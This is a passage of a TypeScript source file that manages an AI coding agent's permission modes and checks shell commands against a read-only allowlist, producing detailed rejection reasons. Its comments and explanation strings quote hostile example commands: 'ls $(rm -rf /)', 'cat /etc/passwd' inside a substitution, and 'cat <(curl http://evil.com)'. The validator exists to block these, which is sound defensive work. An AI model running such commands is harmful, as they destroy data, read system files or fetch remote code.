      modeVersion: existing.modeVersion + 1,
      lastChangedAt: changedAt,
      lastChangedBy: changedBy,
    };
    this.states.set(mapKey, newState);

    debug(`[Mode] Set permission mode to ${mode} for session ${key.sessionId} (changedBy=${changedBy}, modeVersion=${newState.modeVersion})`);

    // Notify callbacks (for NessyAgent internal sync)
    const callbacks = this.callbacks.get(mapKey);
    if (callbacks?.onStateChange) {
      callbacks.onStateChange(newState);
    }

    // Notify React subscribers (for useSyncExternalStore)
    this.subscribers.get(mapKey)?.forEach(cb => cb());
    return true;
  }

  /**
   * Mark the current user-origin mode change signal as consumed.
   * No-op unless the latest mode change was user-initiated.
   */
  consumeUserModeSignal(key: SessionKey): void {
    const existing = this.getState(key);
    if (existing.lastChangedBy !== 'user') {
      return;
    }

    if (existing.lastUserSignalConsumedModeVersion === existing.modeVersion) {
      return;
    }

    const newState: ModeState = {
      ...existing,
      lastUserSignalConsumedModeVersion: existing.modeVersion,
    };
    this.states.set(encodeSessionKey(key), newState);
  }

  /**
   * Register callbacks for a session
   */
  registerCallbacks(key: SessionKey, callbacks: ModeCallbacks): void {
    this.callbacks.set(encodeSessionKey(key), callbacks);
  }

  /**
   * Unregister callbacks for a session
   */
  unregisterCallbacks(key: SessionKey, owner?: object): void { // F1.397 — with an owner, only while the registration is still that owner's
    const mapKey = encodeSessionKey(key); if (owner === undefined || this.callbacks.get(mapKey)?.owner === owner) this.callbacks.delete(mapKey);
  }

  /**
   * Clean up a session's state
   */
  cleanupSession(key: SessionKey): void {
    const mapKey = encodeSessionKey(key);
    this.states.delete(mapKey);
    this.callbacks.delete(mapKey);
    this.subscribers.delete(mapKey);
  }

  /**
   * Subscribe to mode changes for a session (for React useSyncExternalStore)
   * Returns an unsubscribe function
   */
  subscribe(key: SessionKey, callback: () => void): () => void {
    const mapKey = encodeSessionKey(key);
    if (!this.subscribers.has(mapKey)) {
      this.subscribers.set(mapKey, new Set());
    }
    this.subscribers.get(mapKey)!.add(callback);

    // Return unsubscribe function
    return () => {
      this.subscribers.get(mapKey)?.delete(callback);
    };
  }
}

// Singleton manager instance
export const modeManager = new ModeManager();

// ============================================================
// Permission Mode API
// ============================================================

/**
 * Get the current permission mode for a session
 */
export function getPermissionMode(key: SessionKey): PermissionMode {
  return modeManager.getState(key).permissionMode;
}

/**
 * Set the permission mode for a session.
 * @returns true when state changed, false when mode was unchanged
 */
export function setPermissionMode(
  key: SessionKey,
  mode: PermissionMode,
  metadata?: { changedBy?: PermissionModeChangedBy; changedAt?: string }
): boolean {
  return modeManager.setPermissionMode(key, mode, metadata);
}

/**
 * Consume one-turn user mode-change signal for the current modeVersion.
 */
export function consumeUserModeSignal(key: SessionKey): void {
  modeManager.consumeUserModeSignal(key);
}

/**
 * Cycle to the next permission mode (for SHIFT+TAB)
 * @param key - The session to cycle mode for
 * @param enabledModes - Optional list of enabled modes to cycle through (defaults to all modes)
 * Returns the new mode
 */
/**
 * NOTE (2026-08-13): this has no live production caller — the desktop's mode
 * cycling goes through the `setPermissionMode` RPC, which is guarded. It is
 * kept because tests use it, but note that `enabledModes` can name
 * `bypassPermissions`, and this function writes the mode-manager singleton
 * DIRECTLY: wiring it into a UI would create a mode-acceptance point that never
 * consults `assertBypassPermittedForProcess` (see
 * `agent/pi-harness/bypass-root-guard.ts` and its three call sites in
 * `SessionManager`). Route any new cycling UI through the RPC instead.
 */
export function cyclePermissionMode(
  key: SessionKey,
  enabledModes?: PermissionMode[]
): PermissionMode {
  const currentMode = getPermissionMode(key);
  // Use provided modes or default to the standard rotation (which excludes the
  // opt-in `dontAsk` — see DEFAULT_CYCLABLE_PERMISSION_MODES).
  const modes = enabledModes && enabledModes.length >= 2 ? enabledModes : DEFAULT_CYCLABLE_PERMISSION_MODES;
  const currentIndex = modes.indexOf(currentMode);

  // If current mode not in enabled list, jump to first enabled mode
  if (currentIndex === -1) {
    const nextMode = modes[0] ?? 'default';
    setPermissionMode(key, nextMode, { changedBy: 'user' });
    return nextMode;
  }

  const nextIndex = (currentIndex + 1) % modes.length;
  // Safe assertion: nextIndex is always valid due to modulo operation
  const nextMode = modes[nextIndex] as PermissionMode;
  setPermissionMode(key, nextMode, { changedBy: 'user' });
  return nextMode;
}

/**
 * Subscribe to mode changes for a session (for React useSyncExternalStore)
 * Returns an unsubscribe function
 */
export function subscribeModeChanges(key: SessionKey, callback: () => void): () => void {
  return modeManager.subscribe(key, callback);
}

/**
 * Get mode state for a session
 */
export function getModeState(key: SessionKey): ModeState {
  return modeManager.getState(key);
}

/**
 * Hydrate persisted transition context for a session without changing current mode.
 */
export function hydratePreviousPermissionMode(key: SessionKey, previousPermissionMode?: PermissionMode): void {
  modeManager.setPreviousPermissionMode(key, previousPermissionMode);
}

/**
 * Lightweight diagnostics for permission denials and debugging.
 */
export function getPermissionModeDiagnostics(key: SessionKey): {
  permissionMode: PermissionMode;
  previousPermissionMode?: PermissionMode;
  transitionDisplay?: string;
  modeVersion: number;
  lastChangedAt: string;
  lastChangedBy: PermissionModeChangedBy;
  userModeSignalPending: boolean;
} {
  const state = modeManager.getState(key);
  const transitionDisplay = state.previousPermissionMode
    ? `${PERMISSION_MODE_AGENT_LABELS[state.previousPermissionMode]} -> ${PERMISSION_MODE_AGENT_LABELS[state.permissionMode]}`
    : undefined;
  const userModeSignalPending =
    state.lastChangedBy === 'user' &&
    state.modeVersion > 0 &&
    state.lastUserSignalConsumedModeVersion !== state.modeVersion;

  return {
    permissionMode: state.permissionMode,
    previousPermissionMode: state.previousPermissionMode,
    transitionDisplay,
    modeVersion: state.modeVersion,
    lastChangedAt: state.lastChangedAt,
    lastChangedBy: state.lastChangedBy,
    userModeSignalPending,
  };
}

/**
 * Initialize permission mode state for a session with callbacks
 */
export function initializeModeState(
  key: SessionKey,
  initialMode: PermissionMode | { permissionMode?: PermissionMode },
  callbacks?: ModeCallbacks
): void {
  let mode: PermissionMode;

  if (typeof initialMode === 'string') {
    mode = initialMode;
  } else if ('permissionMode' in initialMode && initialMode.permissionMode) {
    mode = initialMode.permissionMode;
  } else {
    // The manual mode if not specified
    mode = 'default';
  }

  // IMPORTANT: Register callbacks BEFORE setting mode so the initial
  // state change triggers the callback.
  if (callbacks) {
    modeManager.registerCallbacks(key, callbacks);
  }
  modeManager.setPermissionMode(key, mode, { changedBy: 'restore' });
}

/**
 * Clean up mode state for a session
 */
export function cleanupModeState(key: SessionKey): void {
  modeManager.cleanupSession(key);
}

// ============================================================
// Tool Blocking Logic (Centralized)
// ============================================================

/**
 * Config type that works with both ModeConfig and MergedPermissionsConfig
 */
type ToolCheckConfig = ModeConfig | MergedPermissionsConfig;

/**
 * Dangerous control characters that could cause issues at lower levels.
 *
 * Note: Newlines and carriage returns are NOT blocked because bash-parser
 * correctly handles them as command separators, and the AST validation
 * checks each command individually. Only null bytes are blocked as they
 * could cause issues with C bindings and string handling.
 */
const DANGEROUS_CONTROL_CHARS = new Set([
  '\x00',  // Null byte - can truncate strings in some contexts
]);

/**
 * Check if a command contains dangerous control characters.
 *
 * @param command - The bash command to check
 * @returns true if command contains dangerous control chars, false if safe
 */
export function hasDangerousControlChars(command: string): boolean {
  for (const char of command) {
    if (DANGEROUS_CONTROL_CHARS.has(char)) {
      debug(`[Mode] Dangerous control character detected (code ${char.charCodeAt(0)}) in command`);
      return true;
    }
  }
  return false;
}

/**
 * Check if a command contains dangerous command/process substitution patterns.
 *
 * Detects:
 * - Command substitution: $(...) or `...` (backticks)
 * - Process substitution: <(...) or >(...)
 *
 * These are dangerous because they execute arbitrary commands:
 * - `ls $(rm -rf /)` - the rm runs during argument expansion
 * - `echo "$(cat /etc/passwd)"` - executes even inside double quotes
 * - `cat <(curl http://evil.com)` - process substitution runs curl
 *
 * Note: Single-quoted strings are safe: `echo '$(rm)'` is literal text
 *
 * @param command - The bash command to check
 * @returns true if command contains dangerous substitution, false if safe
 */
export function hasDangerousSubstitution(command: string): boolean {
  let inSingleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const char = command[i];
    const nextChar = command[i + 1];

    // Handle escape sequences (only outside single quotes)
    if (escaped) {
      escaped = false;
      continue;
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true;
      continue;
    }

    // Track single quote state (double quotes don't protect against substitution)
    if (char === "'" && !escaped) {
      inSingleQuote = !inSingleQuote;
      continue;
    }

    // Only check for dangerous patterns outside single quotes
    if (!inSingleQuote) {
      // Command substitution: $(
      if (char === '$' && nextChar === '(') {
        debug(`[Mode] Command substitution $() detected in: ${command}`);
        return true;
      }

      // Backtick command substitution
      if (char === '`') {
        debug(`[Mode] Backtick substitution detected in: ${command}`);
        return true;
      }

      // Process substitution: <( or >(
      if ((char === '<' || char === '>') && nextChar === '(') {
        debug(`[Mode] Process substitution detected in: ${command}`);
        return true;
      }
    }
  }

  return false;
}

// ============================================================
// Bash Rejection Reasons (Detailed error messages)
// ============================================================

/**
 * Pattern info for error messages - shows what patterns might have matched
 */
export interface RelevantPatternInfo {
  source: string;
  comment?: string;
}

/**
 * Detailed reason why a bash command was rejected by the read-only allowlist (Plan, Don't ask).
 * Used to provide helpful error messages that explain exactly what was blocked and why.
 */
export type BashRejectionReason =
  | { type: 'control_char'; char: string; charCode: number; explanation: string }
  | { type: 'no_safe_pattern'; command: string; relevantPatterns: RelevantPatternInfo[]; mismatchAnalysis?: MismatchAnalysis; commandHint?: CompiledBlockedCommandHint }
  | { type: 'dangerous_operator'; operator: string; operatorType: 'chain' | 'redirect'; explanation: string }
  | { type: 'dangerous_substitution'; pattern: string; explanation: string }
  | { type: 'parse_error'; error: string }
  // New AST-based rejection types (from bash-validator)
  | { type: 'pipeline'; explanation: string }
  | { type: 'redirect'; op: string; explanation: string }
  | { type: 'command_expansion'; explanation: string }
  | { type: 'process_substitution'; explanation: string }
  | { type: 'parameter_expansion'; explanation: string }
  | { type: 'env_assignment'; explanation: string }
  | { type: 'unsafe_command'; command: string; explanation: string }
  | { type: 'compound_partial_fail'; failedCommands: string[]; passedCommands: string[] };

/**
 * Human-readable explanations for control characters.
 */
const CONTROL_CHAR_EXPLANATIONS: Record<string, string> = {
  '\n': 'newline acts as command separator in bash (e.g., `safe\\ndangerous` runs both)',
  '\r': 'carriage return can act as command separator',
  '\x00': 'null byte can truncate strings and cause unexpected behavior',
};

/**
 * Find the first dangerous control character in a command.
 * Returns details about the character if found, null otherwise.
 */
function findDangerousControlChar(command: string): { char: string; charCode: number; explanation: string } | null {
  for (const char of command) {
    if (DANGEROUS_CONTROL_CHARS.has(char)) {
      const charCode = char.charCodeAt(0);
      const displayChar = char === '\n' ? '\\n' : char === '\r' ? '\\r' : char === '\x00' ? '\\0' : `\\x${charCode.toString(16).padStart(2, '0')}`;
      const explanation = CONTROL_CHAR_EXPLANATIONS[char] ?? `control character (code ${charCode}) can cause unexpected behavior`;
      return { char: displayChar, charCode, explanation };
    }
  }
  return null;
}

/**
 * Find dangerous command/process substitution in a command.
 * Returns details about the pattern if found, null otherwise.
 */
function findDangerousSubstitution(command: string): { pattern: string; explanation: string } | null {
  let inSingleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const char = command[i];
    const nextChar = command[i + 1];

    if (escaped) {
      escaped = false;
      continue;
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true;
      continue;
    }

    if (char === "'" && !escaped) {
      inSingleQuote = !inSingleQuote;
      continue;
    }

    if (!inSingleQuote) {
      if (char === '$' && nextChar === '(') {
        return {
          pattern: '$()',
          explanation: 'command substitution executes embedded commands during expansion (e.g., `ls $(rm -rf /)`)',
        };
      }

      if (char === '`') {
        return {
          pattern: '`...`',
          explanation: 'backtick substitution executes embedded commands (e.g., `echo \\`rm -rf /\\``)',
        };
      }

      if (char === '<' && nextChar === '(') {
        return {
          pattern: '<()',
          explanation: 'process substitution executes commands and provides output as a file (e.g., `cat <(curl evil.com)`)',
        };
      }

      if (char === '>' && nextChar === '(') {
        return {
          pattern: '>()',
          explanation: 'process substitution executes commands with input from a file descriptor',
        };
      }
    }
  }

  return null;
}

/**
 * Find patterns that might be relevant to the attempted command.
 * Extracts the first word (command name) and finds patterns containing it.
 * This helps provide actionable error messages when a command is blocked.
 *
 * For example, if the command is "git -C /path status", this will find
 * the git pattern and show the agent what format is expected.
 */
function findRelevantPatterns(command: string, patterns: CompiledBashPattern[]): RelevantPatternInfo[] {
  // Extract the first word (command name) from the command
  const firstWord = command.trim().split(/\s+/)[0]?.toLowerCase();
  if (!firstWord) return [];

  // Find patterns whose source contains the command name
  // This catches patterns like "^git\s+(status|log|...)" when command starts with "git"
  const relevant: RelevantPatternInfo[] = [];

  for (const pattern of patterns) {
    // Check if the pattern source contains the command name
    // Use case-insensitive matching and look for the command at word boundaries
    const sourceLower = pattern.source.toLowerCase();
    if (
      sourceLower.includes(firstWord) ||
      sourceLower.startsWith(`^${firstWord}`)
    ) {
      relevant.push({
        source: pattern.source,
        comment: pattern.comment,
      });
    }
  }

  // Limit to top 3 most relevant patterns to avoid overwhelming the agent
  return relevant.slice(0, 3);
}

/**
 * Resolve command-specific hint for blocked bash commands.
 * Uses exact base-command match and optional whenNotMatching condition.
 */
function findBlockedCommandHint(command: string, config: ToolCheckConfig): CompiledBlockedCommandHint | undefined {
  const hints = config.blockedCommandHints ?? [];
  if (hints.length === 0) return undefined;

  const firstToken = command.trim().split(/\s+/)[0]?.toLowerCase();
  if (!firstToken) return undefined;
  const baseCommand = firstToken.split('/').pop() ?? firstToken;

  for (const hint of hints) {
    if (hint.command !== baseCommand) continue;

    // If a condition is provided, hint applies only when command does NOT match it
    if (hint.whenNotMatchingRegex && hint.whenNotMatchingRegex.test(command)) {
      continue;
    }

    return hint;
  }

  return undefined;
}

/**
 * Analyze WHY a command didn't match any pattern using incremental regex matching.
 * Uses incr-regex-package to find exactly WHERE in the command matching stopped,
 * which helps generate actionable error messages.
 *
 * For example, if the command is "git -C /path status" and the pattern is
 * "^git\s+(status|log|diff)", this will detect that matching stopped at "-C"
 * and suggest running from within the repo directory instead.
 */
function analyzePatternMismatch(command: string, patterns: CompiledBashPattern[]): MismatchAnalysis | null {
  const trimmedCommand = command.trim();
  if (!trimmedCommand) return null;

  // Find the pattern that matches the longest prefix of the command
  // This gives us the "best match" to analyze
  let bestMatch: {
    matchedCount: number;
    matchedPrefix: string;
    pattern: CompiledBashPattern;
  } | null = null;

  for (const pattern of patterns) {
    try {
      // Simplify the pattern for incr-regex: remove anchors and word boundaries
      // which aren't supported by the incremental matching library.
      // This is fine since we only use it for diagnostic purposes.
      const simplifiedPattern = pattern.source
        .replace(/^\^/, '')     // Remove start anchor
        .replace(/\$$/g, '')    // Remove end anchor
        .replace(/\\b/g, '');   // Remove word boundaries

      // Create incremental regex matcher from the simplified pattern
      // IREGEX is a class that takes a regex pattern string in its constructor
      const incr = new IREGEX(simplifiedPattern);

      // Use matchStr to process the entire command and get match info
      // Returns [success, charCount, matchedString]
      const [_success, charCount, matchedStr] = incr.matchStr(trimmedCommand);

      // Track the pattern that matched the most characters (best partial match)
      if (charCount > 0 && (!bestMatch || charCount > bestMatch.matchedCount)) {
        bestMatch = {
          matchedCount: charCount,
          matchedPrefix: matchedStr || trimmedCommand.substring(0, charCount),
          pattern,
        };
      }
    } catch {
      // If incr-regex can't parse the pattern (complex regex features),
      // skip this pattern - we'll fall back to basic diagnostics
      continue;
    }
  }

  // If no pattern matched anything, return null (unknown command)
  if (!bestMatch || bestMatch.matchedCount === 0) {
    return null;
  }

  // Analyze what token caused the mismatch
  const failedPosition = bestMatch.matchedCount;
  const remainingCommand = trimmedCommand.substring(failedPosition).trim();
  const failedToken = remainingCommand.split(/\s+/)[0] || '';

  // Generate a helpful suggestion based on what we found
  const suggestion = generateMismatchSuggestion(
    trimmedCommand,
    bestMatch.matchedPrefix,
    failedToken,
    bestMatch.pattern
  );

  return {
    matchedPrefix: bestMatch.matchedPrefix,
    failedAtPosition: failedPosition,
    failedToken,
    bestMatchPattern: {
      source: bestMatch.pattern.source,
      comment: bestMatch.pattern.comment,
    },
    suggestion,
  };
}

/**
 * Generate an actionable suggestion based on pattern mismatch analysis.
 * Looks for common patterns like flags before subcommands in git/gh/docker.
 */
function generateMismatchSuggestion(
  command: string,
  matchedPrefix: string,
  failedToken: string,
  pattern: CompiledBashPattern
): string | undefined {
  const firstWord = command.split(/\s+/)[0]?.toLowerCase();

  // Detect "flags before subcommand" pattern for git, gh, docker, kubectl
  const commandsWithSubcommands = ['git', 'gh', 'docker', 'kubectl', 'npm', 'yarn', 'cargo'];
  if (
    commandsWithSubcommands.includes(firstWord || '') &&
    failedToken.startsWith('-')
  ) {
    // The command has a flag where a subcommand was expected
    // Try to find the actual subcommand later in the command
    const words = command.split(/\s+/);
    const subcommandCandidates = words.slice(1).filter(w => !w.startsWith('-') && !w.includes('/'));

    if (subcommandCandidates.length > 0) {
      const likelySubcommand = subcommandCandidates[0];
      return `The pattern expects \`${firstWord} <subcommand>\` directly, but found flag \`${failedToken}\` first. ` +
        `Try running from within the target directory, or use: \`${firstWord} ${likelySubcommand} ...\``;
    }

    // No escape hint here — P2.38. This sentence is embedded in the
    // `no_safe_pattern` message, which already ends with exactly one, resolved
    // for the mode actually in force. It used to append "or switch to
    // Manual/Bypass permissions mode", which was Explore's escape, so a single
    // `plan` refusal of `git -v` carried BOTH that and "Call SubmitPlan…", and a
    // `dontAsk` one carried it beside "This call needs an explicit allow rule…"
    // (measured on this file's parent). `generateMismatchSuggestion` runs at
    // rejection-BUILD time and has no mode, so the dumb fix is the right one:
    // say only the part that is true in every mode and let the one hint at the
    // end of the message be the way out.
    return `The pattern expects a subcommand after \`${firstWord}\`, but found flag \`${failedToken}\`. ` +
      `Run from the target directory.`;
  }

  // Detect possible typos in subcommands using simple heuristics
  // (Check if failedToken is close to any word in the pattern)
  if (pattern.comment && !failedToken.startsWith('-')) {
    // Extract subcommand options from pattern comment if present
    // e.g., "Git read-only operations: view status, history, branches, diffs"
    const commentLower = pattern.comment.toLowerCase();
    const failedTokenLower = failedToken.toLowerCase();

    // Check for common subcommand names in the comment
    const commonSubcommands = ['status', 'log', 'diff', 'show', 'branch', 'list', 'view', 'get', 'describe'];
    for (const sub of commonSubcommands) {
      // Simple Levenshtein-ish check: if token is within 2 chars of a known subcommand
      if (
        commentLower.includes(sub) &&
        Math.abs(failedTokenLower.length - sub.length) <= 2 &&
        failedTokenLower !== sub
      ) {
        // Check if first 2 chars match (simple typo detection)
        if (failedTokenLower.substring(0, 2) === sub.substring(0, 2)) {
          return `Did you mean \`${firstWord} ${sub}\` instead of \`${firstWord} ${failedToken}\`?`;
        }
      }
    }
  }

  // Generic fallback
  return undefined;
}

// ============================================================
// Windows Path Helpers (for bash-parser fallback)
// ============================================================

/**
 * Check if a command looks like a Windows CMD builtin that can't be parsed
 * by bash-parser or normalized via path rewriting.
 */
function looksLikeCmdBuiltin(command: string): boolean {
  // Match CMD builtins at the start of the command (case-insensitive).
  // Note: `type` is excluded because it's also a valid bash builtin (check command type).
  // Note: `mkdir` is excluded because it's also a valid Unix/bash command.
  return /^(?:if\s+(?:not\s+)?exist|for\s+\/[a-z]|set\s+\w+=|copy\s|move\s|ren(?:ame)?\s|del\s|erase\s|rd\s|rmdir\s|md\s|assoc\s|ftype\s)\b/i.test(command);
}

/**
 * Normalize Windows backslash paths in a command string so that bash-parser
 * (a POSIX parser) can handle them without treating \ as escape characters.
 *
 * Converts backslashes to forward slashes inside:
 * - Double-quoted strings: "C:\Users\..." → "C:/Users/..."
 * - Single-quoted strings: passed through (bash-parser treats them as literal anyway)
 * - Unquoted tokens that look like Windows paths: C:\Users\... → C:/Users/...
 *
 * Preserves actual bash escape sequences (\n, \t, \\, \", etc.) inside
 * double-quoted strings by only converting backslashes that precede
 * characters that are NOT standard bash escape targets.
 */
export function normalizeWindowsPathsForBashParser(command: string): string {
  let result = '';
  let i = 0;

  while (i < command.length) {
    const ch = command[i];

    if (ch === "'") {
      // Single-quoted string: copy verbatim (bash treats contents literally)
      const end = command.indexOf("'", i + 1);
      if (end === -1) {
        // Unclosed single quote - copy rest as-is
        result += command.slice(i);
        break;
      }
      result += command.slice(i, end + 1);
      i = end + 1;
    } else if (ch === '"') {
      // Double-quoted string: fix the critical \" issue for Windows paths.
      //
      // In bash, \X inside double quotes is only special for 5 chars: \ " $ ` !
      // For all other chars, bash-parser keeps the literal \X (no stripping).
      // So the ONLY problem case is \" which bash-parser treats as an escaped
      // quote instead of "backslash + closing-quote". This happens when a
      // Windows path ends with \ right before the closing ":
      //   ls "C:\path\"  →  bash-parser sees \" as escaped quote, string never closes
      //
      // Fix: convert \\ to // (prevents double-backslash from eating a path sep)
      // and convert \" to /" (prevents the unclosed-quote parse failure).
      // Leave all other \X alone since bash-parser handles them correctly.
      result += '"';
      i++;
      while (i < command.length && command[i] !== '"') {
        if (command[i] === '\\' && i + 1 < command.length) {
          const next = command[i + 1];
          if (next === '"') {
            // \\" → /" — this is the critical fix for the "Unclosed quote" bug.
            // Convert the backslash to / so bash-parser sees the closing quote.
            result += '/';
            // Don't consume the quote - let the outer loop see it as closing
            i++;
          } else if (next === '\\') {
            // \\\\ → // — convert double-backslash to double-forward-slash
            result += '//';
            i += 2;
          } else {
            // All other \X — pass through literally (bash-parser keeps them as-is)
            result += command[i]! + next!;
            i += 2;
          }
        } else {
          result += command[i]!;
          i++;
        }
      }
      if (i < command.length) {
        result += '"'; // closing quote
        i++;
      }
    } else {
      // Unquoted context: detect Windows-style path tokens and convert
      // A Windows path looks like X:\ at the start of a "word"
      if (
        /[A-Za-z]/.test(ch!) &&
        i + 2 < command.length &&
        command[i + 1]! === ':' &&
        command[i + 2]! === '\\'
      ) {
        // Consume the path token (up to whitespace or special shell chars)
        let pathEnd = i;
        while (pathEnd < command.length && !/[\s|&;()<>]/.test(command[pathEnd]!)) {
          pathEnd++;
        }
        const pathToken = command.slice(i, pathEnd).replace(/\\/g, '/');
        result += pathToken;
        i = pathEnd;
      } else {
        result += ch;
        i++;
      }
    }
  }

  return result;
}

/**
 * Get detailed reason why a bash command would be rejected.
 * Returns null if the command is safe, otherwise returns the specific reason.
 *
 * Uses AST-based validation for compound commands (&&, ||, ;) to allow
 * safe compound commands like `git status && git log` while still blocking
 * dangerous constructs.
 *
 * For PowerShell commands (detected by syntax or on Windows), uses the
 * PowerShell validator with native System.Management.Automation parsing.
 *
 * This is used to provide helpful error messages that explain exactly what
 * was blocked and why, helping the agent understand and avoid the issue.
 */
export function getBashRejectionReason(command: string, config: ToolCheckConfig): BashRejectionReason | null {
  const trimmedCommand = command.trim();

  // Step 1: Check for dangerous control characters (before parsing)
  // These could affect parsing itself, so check first
  const controlChar = hasControlCharacters(trimmedCommand);
  if (controlChar) {
    return {
      type: 'control_char',
      char: controlChar.char,
      charCode: 0, // Not used in new flow, but kept for compatibility
      explanation: controlChar.explanation,
    };
  }

  // Step 2: Determine if this is a PowerShell command
  // Use PS validator only for commands that look like PowerShell syntax.
  // On Windows, non-PowerShell commands (e.g. `git status && git log`) are
  // validated via bash-parser with Windows path normalization instead, because
  // the PS parser has different semantics for redirects, subshells, $(), etc.
  const isWindows = process.platform === 'win32';
  const isPsCommand = looksLikePowerShellOutsidePosixTest(trimmedCommand); // UA12.104 — not for `test 1 -eq 1`

  if (isPsCommand && isPowerShellAvailable()) {
    debug('[Mode] Using PowerShell validator for command:', trimmedCommand);
    const psRejection = getPowerShellRejectionReason(trimmedCommand, config); if (psRejection !== null) return psRejection; // UA12.184 follow-up + UA12.208: a POSIX shell RUNS a Bash-tool line on every platform (Windows: Claude's Git Bash, Pi's bash), so the bash gate below judges it too
  }

  // Step 2b: On Windows, reject CMD-only syntax early.
  // Commands like `if not exist`, `for /f`, `set VAR=` are Windows CMD builtins
  // that neither bash-parser nor path normalization can handle.
  if (isWindows && looksLikeCmdBuiltin(trimmedCommand)) {
    return {
      type: 'parse_error',
      error: 'Windows CMD syntax (if/for/set/copy/move) is not supported by the read-only command check of Plan and Don\'t ask modes. Use PowerShell equivalents or bash commands instead.',
    };
  }

  // Step 2c: On Windows, normalize backslash paths for bash-parser.
  // bash-parser is POSIX and treats \ as escape chars, mangling Windows paths like
  // C:\Users\... into C:Users... or failing on trailing backslash-quote (\").
  const commandForParser = isWindows
    ? normalizeWindowsPathsForBashParser(trimmedCommand)
    : trimmedCommand;

  // Step 3: Use bash AST-based validation
  // This handles compound commands, pipelines, redirects, and substitutions properly
  const astResult = validateBashCommand(commandForParser, config.readOnlyBashPatterns);

  if (astResult.allowed) {
    debug('[Mode] Command allowed via AST validation:', trimmedCommand);
    return null;
  }

  // Step 3: Convert AST rejection reason to BashRejectionReason
  if (astResult.reason) {
    const reason = astResult.reason;

    switch (reason.type) {
      case 'parse_error':
        return { type: 'parse_error', error: reason.error };

      case 'pipeline':
        // Convert to the legacy format for consistent error messages
        return {
          type: 'dangerous_operator',
          operator: '|',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'redirect':
        return {
          type: 'dangerous_operator',
          operator: reason.op,
          operatorType: 'redirect',
          explanation: reason.explanation,
        };

      case 'command_expansion':
        return {
          type: 'dangerous_substitution',
          pattern: '$()',
          explanation: reason.explanation,
        };

      case 'process_substitution':
        return {
          type: 'dangerous_substitution',
          pattern: '<() or >()',
          explanation: reason.explanation,
        };

      case 'parameter_expansion':
        return {
          type: 'dangerous_substitution',
          pattern: '${} / $VAR',
          explanation: reason.explanation,
        };

      case 'env_assignment':
        return {
          type: 'dangerous_substitution',
          pattern: 'VAR=value',
          explanation: reason.explanation,
        };

      case 'unsafe_command': {
        // Find relevant patterns to help the agent understand what format is expected
        const relevantPatterns = findRelevantPatterns(reason.command, config.readOnlyBashPatterns);
        const mismatchAnalysis = analyzePatternMismatch(reason.command, config.readOnlyBashPatterns);
        const commandHint = findBlockedCommandHint(reason.command, config);

        return {
          type: 'no_safe_pattern',
          command: reason.command,
          relevantPatterns,
          mismatchAnalysis: mismatchAnalysis ?? undefined,
          commandHint,
        };
      }

      case 'compound_partial_fail':
        // Return info about which commands failed in a compound expression
        return {
          type: 'compound_partial_fail',
          failedCommands: reason.failedCommands,
          passedCommands: reason.passedCommands,
        };

      case 'background_execution':
        // Background execution with & operator - convert to dangerous_operator format
        return {
          type: 'dangerous_operator',
          operator: '&',
          operatorType: 'chain',
          explanation: reason.explanation,
        };
    }
  }

  // Fallback: shouldn't reach here, but return generic rejection if we do
  debug('[Mode] Unexpected: AST rejected but no reason provided');
  return {
    type: 'no_safe_pattern',
    command: trimmedCommand,
    relevantPatterns: [],
    mismatchAnalysis: undefined,
    commandHint: findBlockedCommandHint(trimmedCommand, config),
  };
}

/**
 * Get detailed reason why a PowerShell command would be rejected.
 * Converts PowerShell validation results to BashRejectionReason format
 * for consistent error message handling.
 */
function getPowerShellRejectionReason(command: string, config: ToolCheckConfig): BashRejectionReason | null {
  const psResult = validatePowerShellCommand(command, config.readOnlyBashPatterns);

  if (psResult.allowed) {
    debug('[Mode] PowerShell command allowed via AST validation:', command);
    return null;
  }

  // Convert PowerShell rejection reason to BashRejectionReason format
  if (psResult.reason) {
    const reason = psResult.reason;

    switch (reason.type) {
      case 'parse_error':
        return { type: 'parse_error', error: reason.error };

      case 'powershell_unavailable':
        // Fall back to bash validation if PowerShell is not available
        debug('[Mode] PowerShell unavailable, falling back to bash validation');
        return null;

      case 'pipeline':
        return {
          type: 'dangerous_operator',
          operator: '|',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'redirect':
        return {
          type: 'dangerous_operator',
          operator: '>',
          operatorType: 'redirect',
          explanation: reason.explanation,
        };

      case 'subexpression':
        return {
          type: 'dangerous_substitution',
          pattern: '$()',
          explanation: reason.explanation,
        };

      case 'script_block':
        return {
          type: 'dangerous_substitution',
          pattern: '{ }',
          explanation: reason.explanation,
        };

      case 'invoke_expression':
        return {
          type: 'dangerous_substitution',
          pattern: 'Invoke-Expression',
          explanation: reason.explanation,
        };

      case 'dot_sourcing':
        return {
          type: 'dangerous_substitution',
          pattern: '. (dot-sourcing)',
          explanation: reason.explanation,
        };

      case 'assignment':
        return {
          type: 'dangerous_operator',
          operator: '=',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'background_execution':
        return {
          type: 'dangerous_operator',
          operator: '&',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'unsafe_command': {
        const relevantPatterns = findRelevantPatterns(reason.command, config.readOnlyBashPatterns);
        const mismatchAnalysis = analyzePatternMismatch(reason.command, config.readOnlyBashPatterns);
        const commandHint = findBlockedCommandHint(reason.command, config);

        return {
          type: 'no_safe_pattern',
          command: reason.command,
          relevantPatterns,
          mismatchAnalysis: mismatchAnalysis ?? undefined,
          commandHint,
        };
      }
    }
  }

  // Fallback
  debug('[Mode] Unexpected: PowerShell AST rejected but no reason provided');
  return {
    type: 'no_safe_pattern',
    command: command,
    relevantPatterns: [],
    mismatchAnalysis: undefined,
    commandHint: findBlockedCommandHint(command, config),
  };
}

/**
 * Format actionable guidance for permission customization.
 * Tells the agent where to read/modify permissions.
 *
 * `mode` is here for the same reason it is on {@link getBlockReasonWithConfig}:
 * the sentence used to say "allowed in Explore mode" on every path, and the
 * files it points at are the read-only allowlist that governs `plan` and
 * `dontAsk` too. Measured on the parent commit, a `dontAsk` session refused
 * `frobnicate --now` and was told to read what "Explore mode" allows — a mode it
 * is not in and cannot reach by pressing anything. One argument, resolved
 * through {@link resolveModeDisplayName} like every other mode name in this file.
 */
function formatPermissionGuidance(config: ToolCheckConfig, mode: PermissionMode): string {
  const lines: string[] = [];

  // Only include guidance if permission paths are available
  if (config.permissionPaths) {
    lines.push('');
